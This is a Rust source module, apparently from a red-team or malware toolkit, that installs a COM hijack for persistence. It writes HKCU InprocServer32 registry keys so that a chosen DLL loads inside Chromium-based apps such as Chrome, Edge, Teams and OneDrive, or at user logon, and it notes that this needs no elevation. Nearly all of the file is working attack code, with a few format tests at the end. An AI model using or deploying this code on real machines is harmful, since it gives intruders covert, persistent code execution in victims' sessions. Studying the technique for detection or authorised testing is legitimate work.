//! COM hijack registry installer.
//!
//! Writes HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32 pointing to the
//! DLL path. ThreadingModel = "Apartment" is required for in-process COM objects.
//!
//! No elevation needed — HKCU is writable at medium integrity.
//! HKCU takes priority over HKLM when COM resolves CLSIDs.

/// Default CLSID: directmanipulation.dll — triggers inside Chrome, Edge,
/// Teams, OneDrive (Chromium-based processes via DirectManipulation COM).
/// Source: SpecterOps "Revisiting COM Hijacking", May 2025.
pub const CLSID_BROWSER: &str = "{54E211B6-3650-4F75-8334-FA359598E1C5}";

/// Logon CLSID: CacheTask (wininet.dll) — triggers at user logon via Task
/// Scheduler's Microsoft\Windows\Wininet\CacheTask.
/// Source: PentestLab "Persistence: COM Hijacking".
pub const CLSID_LOGON: &str = "{0358B920-0AC7-461F-98F4-58E32CD89148}";

/// Register `dll_path` as the InprocServer32 handler for `clsid` in HKCU.
/// Returns Ok(()) on success, Err(String) with description on failure.
///
/// Sets:
///   HKCU\SOFTWARE\Classes\CLSID\{clsid}\InprocServer32\(Default) = dll_path
///   HKCU\SOFTWARE\Classes\CLSID\{clsid}\InprocServer32\ThreadingModel = "Apartment"
#[cfg(windows)]
pub fn install_com_hijack(clsid: &str, dll_path: &str) -> Result<(), String> {
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegCreateKeyExW, RegSetValueExW,
        HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
        REG_OPTION_NON_VOLATILE,
    };
    use windows_sys::Win32::Foundation::ERROR_SUCCESS;

    let reg_path = format!(
        "SOFTWARE\\Classes\\CLSID\\{}\\InprocServer32\0",
        clsid
    );
    let reg_path_w: Vec<u16> = reg_path.encode_utf16().collect();

    let mut hkey = 0isize;
    let mut disposition = 0u32;

    let status = unsafe {
        RegCreateKeyExW(
            HKEY_CURRENT_USER,
            reg_path_w.as_ptr(),
            0,
            core::ptr::null(),
            REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE,
            core::ptr::null(),
            &mut hkey,
            &mut disposition,
        )
    };

    if status != ERROR_SUCCESS as i32 {
        return Err(format!("RegCreateKeyExW failed: {}", status));
    }

    // Set (Default) = dll_path
    let dll_path_w: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0u16)).collect();
    let status = unsafe {
        RegSetValueExW(
            hkey,
            core::ptr::null(), // NULL lpValueName = "(Default)"
            0,
            REG_SZ,
            dll_path_w.as_ptr() as _,
            (dll_path_w.len() * 2) as u32,
        )
    };
    if status != ERROR_SUCCESS as i32 {
        unsafe { RegCloseKey(hkey); }
        return Err(format!("RegSetValueExW (Default) failed: {}", status));
    }

    // Set ThreadingModel = "Apartment"
    let tm_name: Vec<u16> = "ThreadingModel\0".encode_utf16().collect();
    let tm_val:  Vec<u16> = "Apartment\0".encode_utf16().collect();
    let status = unsafe {
        RegSetValueExW(
            hkey,
            tm_name.as_ptr(),
            0,
            REG_SZ,
            tm_val.as_ptr() as _,
            (tm_val.len() * 2) as u32,
        )
    };
    if status != ERROR_SUCCESS as i32 {
        unsafe { RegCloseKey(hkey); }
        return Err(format!("RegSetValueExW ThreadingModel failed: {}", status));
    }

    unsafe { RegCloseKey(hkey); }
    Ok(())
}

#[cfg(not(windows))]
pub fn install_com_hijack(_clsid: &str, _dll_path: &str) -> Result<(), String> {
    Err("install_com_hijack is Windows-only".into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clsid_browser_format() {
        // CLSID must be in {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} format
        assert!(CLSID_BROWSER.starts_with('{'));
        assert!(CLSID_BROWSER.ends_with('}'));
        assert_eq!(CLSID_BROWSER.len(), 38);
    }

    #[test]
    fn clsid_logon_format() {
        assert!(CLSID_LOGON.starts_with('{'));
        assert!(CLSID_LOGON.ends_with('}'));
        assert_eq!(CLSID_LOGON.len(), 38);
    }

    #[test]
    fn install_noop_on_linux() {
        let r = install_com_hijack(CLSID_BROWSER, "C:\\fake\\path.dll");
        // On Linux, always returns Err — that's expected
        #[cfg(not(windows))]
        assert!(r.is_err());
        // On Windows, would write registry
        let _ = r;
    }
}
